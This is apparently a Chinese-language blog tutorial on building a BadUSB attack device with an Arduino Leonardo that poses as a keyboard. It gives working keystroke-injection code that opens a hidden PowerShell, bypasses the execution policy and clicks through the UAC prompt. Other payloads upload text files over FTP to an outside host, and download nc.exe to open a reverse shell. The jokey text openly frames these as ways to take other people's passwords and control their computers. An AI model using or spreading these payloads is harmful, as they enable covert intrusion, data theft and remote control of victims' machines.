[TOC]

# BadUSB简介

BadUSB是利用伪造HID设备执行攻击载荷的一种攻击方式。用户插入BadUSB，就会自动执行预置在固件中的恶意代码，如下载服务器上的恶意文件，执行恶意操作等。由于恶意代码内置于设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，杀毒软件更是无法检测设备固件中的恶意代码。这种攻击方式可以在不经意间实施攻击，而且不易被杀软或系统发觉~~事了拂袖去，深藏功与名~~

# 原理

## HID

HID是Human Interface Device的缩写，HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击载荷隐藏在一个正常的鼠标键盘中，或者将带有攻击载荷的设备伪装成HID设备。当用户将含有攻击载荷的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。

## Arduino 

Arduino是一款便捷灵活、方便上手的开源电子原型平台。包含硬件（各种型号的Arduino板）和软件（Arduino IDE)。Arduino IDE可以在Windows、Macintosh OS X、Linux三大主流操作系统上运行，基于processing IDE开发。对于初学者来说，极易掌握，同时有着足够的灵活性。Arduino语言基于wiring语言开发，是对 avr-gcc库的二次封装，不需要太多的单片机基础、编程基础，简单学习后，可以快速的进行开发。

## Keyboard库

keyboard库的功能是将arduino 模拟成一个usb键盘。可以控制按下/放开键盘上的任意按键。通过设置按键顺序和恰当的延时可以实现组合键的键入

# 实践

在执行本步骤前需要准备以下资源

- 包含Arduino Leonardo芯片，长得像U盘的东西
- Arduino IDE

## 常用API与说明

| API名称                         | 作用            |
| ------------------------------- | --------------- |
| `Keyboard.press(char)`          | 按下某个按键    |
| `Keyboard.release(char)`        | 释放某个按键    |
| `Keyboard.print(const char*)`   | 输入字符串      |
| `Keyboard.println(const char*)` | 输入字符串+回车 |
| `Keyboard.releaseAll()`         | 释放所有按键    |
| `delay(uint millionseconds)`    | 延时函数        |

## 执行流程

Arduino包含两种类型的函数：`void setup()`是在设备初始化时执行的方法，只执行一次；`void loop`是在设备运行时不断执行的循环函数。在编写攻击脚本时，需要根据不同的需求将攻击载荷放置于不同的函数中。

## 简单代码示例

```cpp
void setup()
{ 
  Keyboard.begin();//初始化键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  Keyboard.press('r');//r键 
  delay(500); 
    
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
    
  Keyboard.println("CMD");
  delay(1000); 
    
  Keyboard.println("hELLO wORLD!");//由于开启了大写锁定，大小写颠倒
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}

void loop() {}
```

编译后烧录到固件，双手垂下，~~坐和放宽~~，你就会看到电脑自己运行了CMD，并且敲了个`Hello World!`。嗯，就这么简单

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/7c42ad773912b31bcbbc84a08618367ad8b4e1b2.jpg)

好吧..我知道你想干点坏事。

## 在危险的边缘试探

既然可以在CMD里敲命令，那么目录遍历呀、读取文件呀都是可以做滴。先从一个小小的恶作剧开始吧，在打开CMD后输入`shutdown -s -t 10`试试

```cpp
Keyboard.println("SHUTDOWN -S -T 10");
//更加友尽的命令
Keyboard.println("SHUTDOWN -S -T 0");
```

取消关机的命令是`shutdown -a`，手速要快哦

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/7c42ad773912b31bcbbc84a08618367ad8b4e1b2.jpg)

CMD下使用DIR命令可以遍历目录，或者使用for命令列举文件，文件可以通过默认应用直接打开，如

```cpp
Keyboard.println("DIR");
delay(200)
Keyboard.println("for /r ./ %i in (.txt) do @echo %i ");
Keyboard.println("ftp xxx.xxx.xxx.xxx && mput *.txt");//我什么都不知道.jpg

Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(KEY_F4); 
delay(200);
Keyboard.releaseAll();//我什么都不知道.jpg
```

于是你悄咪咪拿到了别人的密码。

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/7c42ad773912b31bcbbc84a08618367ad8b4e1b2.jpg)

好吧我知道写死的命令满足不了你，你想要个shell。~~离派出所越来越近了~~

## 在作死的边缘试探

BadUSB的反弹shell基于键盘命令实现——在Linux下可以方便地使用`nc`命令来反弹shell，非常方便~~作死~~。但是Windows默认情况下并没有这么方便的工具，我们需要远程下载并执行`nc`文件。这个功能无法用CMD实现——但是WIN7以上有powershell！

```cpp
Keyboard.print("powershell");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);
Keyboard.println("chcp 65001");//将powershell编码切换至utf-8，防止乱码
delay(1000);
Keyboard.println("$dl = new-object system.net.webclient");//使用system.net.webclient对象实现下载功能
delay(1000);
Keyboard.println("$dl.downloadfile('http://example.com/nc.exe','d:\\nc.exe')");//第一个参数为目标文件的URL，第二个参数为本地保存文件路径
delay(1000);
Keyboard.println("d:\\nc.exe -e c:\\WINDOWS\\SYSTEM32\\cmd.exe ip port");
```

于是你得到了一个反弹shell，在远程主机上执行`nc -lvvp port`，然后等鱼上钩就好了。不过....当着别人的面执行nc不够隐秘~~怕不是要被打死~~。不过嘛，powershell很贴心地具有隐藏窗口功能，参数为`-w hidden`。在该模式下，powershell窗口不可见，但是可以输入并执行命令~~简直就是为了BadUSB量身定做的参数~~

```cpp
Keyboard.print("powershell -w hidden");
```

伴随着一闪而过的powershell窗口，你获得了一个反弹shell。~~事了拂袖去，深藏功与名~~

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/7c42ad773912b31bcbbc84a08618367ad8b4e1b2.jpg)

普通的shell满足不了你...好吧，下面讲讲rootshell。注意，由于BadUSB基于模拟键盘，因此你能获得的最大权限与当前用户相同——提权右转WindowsEXP——不过有shell上传文件与执行并不是难事。假设当前用户是管理员，那么可以通过`powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden`来开启管理员powershell，在执行时使用`CTRL+SHIFT+ENTER`来申请管理员权限。等等，遇到UAC怎么办？

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/timg.jpg)

答案：`ALT+Y`

```cpp
Keyboard.print("powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden");
delay(500);

Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_SHIFT);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);

Keyboard.press(KEY_LEFT_ALT);
Keyboard.press('y');
delay(200);
```

后面就是常规的下载+执行操作了。这样一来，你获得了rootshell，为所欲为。

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/7c42ad773912b31bcbbc84a08618367ad8b4e1b2.jpg)

额...打开运行菜单并输入执行命令的步骤是无法省略的，过低的延迟会让系统反应不及而导致执行失败~~在运行栏疯狂鬼畜~~。不过——至少我们能努努力，不让CMD或POWERSHELL的窗口弹出来。

```cpp
Keyboard.print("cmd /c start /min powershell -w hidden");
```

通过隐藏的CMD窗口调用POWERSHELL，这下一闪而过的窗口都没有啦！

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/7c42ad773912b31bcbbc84a08618367ad8b4e1b2.jpg)

![](https://tinytracer-1256246079.cos.ap-guangzhou.myqcloud.com/v2-58f61002cc081f020c55e854ce07c94a_hd.jpg)

(未完待续)



